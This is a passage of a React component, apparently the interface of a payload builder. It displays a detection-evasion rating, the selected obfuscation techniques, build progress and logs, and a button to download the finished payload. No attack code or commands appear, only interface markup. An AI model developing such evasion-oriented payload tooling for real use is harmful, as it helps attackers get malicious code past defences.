                <div className="flex items-center justify-between">
                  <span className="text-sm text-muted-foreground">Detection Evasion</span>
                  <Badge
                    variant={
                      getObfuscationPreview().detectionEvasion === "High"
                        ? "default"
                        : getObfuscationPreview().detectionEvasion === "Medium"
                          ? "secondary"
                          : "outline"
                    }
                  >
                    {getObfuscationPreview().detectionEvasion}
                  </Badge>
                </div>
                <Separator />
                <div>
                  <span className="text-sm text-muted-foreground">Active Techniques</span>
                  <div className="mt-2 flex flex-wrap gap-1">
                    {getObfuscationPreview().techniques.length > 0 ? (
                      getObfuscationPreview().techniques.map((tech) => (
                        <Badge key={tech} variant="outline" className="text-xs">
                          {tech}
                        </Badge>
                      ))
                    ) : (
                      <span className="text-sm text-muted-foreground">None selected</span>
                    )}
                  </div>
                </div>
              </CardContent>
            </Card>
          )}

          {/* Build Progress */}
          {(building || buildProgress.length > 0) && (
            <Card>
              <CardHeader>
                <CardTitle className="text-base flex items-center gap-2">
                  <RefreshCw className={`h-4 w-4 ${building ? "animate-spin" : ""}`} />
                  Build Progress
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-3">
                {buildProgress.map((step, index) => (
                  <div key={index} className="space-y-1">
                    <div className="flex items-center justify-between">
                      <span className="text-sm">{step.message}</span>
                      {step.status === "completed" && <CheckCircle2 className="h-4 w-4 text-success" />}
                      {step.status === "failed" && <XCircle className="h-4 w-4 text-destructive" />}
                      {step.status === "running" && <Clock className="h-4 w-4 text-warning animate-pulse" />}
                    </div>
                    <Progress value={step.progress}>
                      <ProgressTrack>
                        <ProgressIndicator style={{ width: `${step.progress}%` }} />
                      </ProgressTrack>
                    </Progress>
                  </div>
                ))}
              </CardContent>
            </Card>
          )}

          {/* Build Logs */}
          {(building || buildLogs.length > 0) && (
            <Card>
              <CardHeader>
                <CardTitle className="text-base flex items-center gap-2">
                  <Terminal className="h-4 w-4" />
                  Build Logs
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="bg-muted rounded-lg p-3 h-48 overflow-y-auto font-mono text-xs">
                  {buildLogs.length > 0 ? (
                    buildLogs.map((log, index) => (
                      <div key={index} className="text-muted-foreground">{log}</div>
                    ))
                  ) : (
                    <p className="text-muted-foreground">No logs yet...</p>
                  )}
                </div>
              </CardContent>
            </Card>
          )}

          {/* Download */}
          {generatedPayload && (
            <Card>
              <CardHeader>
                <CardTitle className="text-base">Payload Ready</CardTitle>
              </CardHeader>
              <CardContent className="space-y-3">
                <div className="flex items-center gap-2 text-success">
                  <CheckCircle2 className="h-4 w-4" />
                  <span className="text-sm font-medium">Build successful</span>
                </div>
                <Button onClick={handleDownload} className="w-full">
                  <Download className="mr-2 h-4 w-4" />
                  Download Payload
                </Button>
                <Button onClick={handleReset} variant="outline" className="w-full">
                  <RefreshCw className="mr-2 h-4 w-4" />
                  Build Another
                </Button>
              </CardContent>
            </Card>
          )}
        </div>
      </div>
    </div>
  )
}
